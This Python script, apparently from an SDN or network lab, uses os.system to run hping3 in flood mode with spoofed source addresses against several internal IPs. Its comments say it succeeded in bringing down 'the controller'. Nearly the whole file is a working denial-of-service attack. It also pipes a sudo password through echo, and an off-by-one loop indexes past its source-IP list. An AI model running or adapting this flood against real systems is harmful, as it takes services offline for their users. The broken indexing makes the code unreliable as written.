import os

# This script was successful
# This script will flood the controller with packages and the controller will be down

packages = "20"
data_size = "120"
dest_ips_left = ["10.0.0.1", "10.0.0.2", "10.0.0.6", "10.0.0.8", "10.0.0.42"]
dest_ips_right = ["10.0.0.3", "10.0.0.4", "10.0.0.5"]
sudoPassword = ''

for i in range(0, len(dest_ips_left) - 1):
    # dest_io = dest_ips_right[i]
    dest_ip = dest_ips_left[i]
    sourc_ip = dest_ips_right[i]
    os.system('echo %s|sudo -S %s' % (
    sudoPassword, "hping3 --flood -c " + packages + " -p 7 " + "-d " + data_size + " -a " + sourc_ip + " " + dest_ip))
